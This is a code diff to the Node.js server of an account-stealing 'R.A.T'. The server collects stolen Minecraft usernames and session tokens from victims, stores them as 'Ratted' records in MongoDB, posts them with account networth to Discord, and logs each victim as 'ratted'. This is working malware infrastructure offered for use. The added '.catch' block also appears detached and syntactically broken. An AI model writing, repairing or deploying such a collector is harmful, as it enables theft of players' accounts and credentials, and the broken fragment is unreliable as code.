@@ -61,7 +61,8 @@ app.post("/", (req, res) => {
     }
 
     if (1==1) {
-        if (usingMongoDB) {
+        if (1==1) { //mojangs way of saying its good
+            if (usingMongoDB) {
                 //create a Ratted object with mongoose schema and save it
                 new Ratted({
                     username: req.body.username,
@@ -81,7 +82,7 @@ app.post("/", (req, res) => {
                 })
             }
 
-        if (usingDiscord) {
+            if (usingDiscord) {
                 // initialize networth variables
                 let networth = "0";
                 let soulboundnetworth = "0";
@@ -179,7 +180,14 @@ app.post("/", (req, res) => {
             }
 
             console.log(`[R.A.T] ${req.body.username} has been ratted!\n${JSON.stringify(req.body)}`)
+        }
     }
+
+    .catch(err => {
+        //could happen if the auth server is down OR if invalid information is passed in the body
+        console.log(`[R.A.T] Error while validating token:\n${err}`)
+    })
+
     //change this to whatever you want, but make sure to send a response
     res.send("OK")
 })
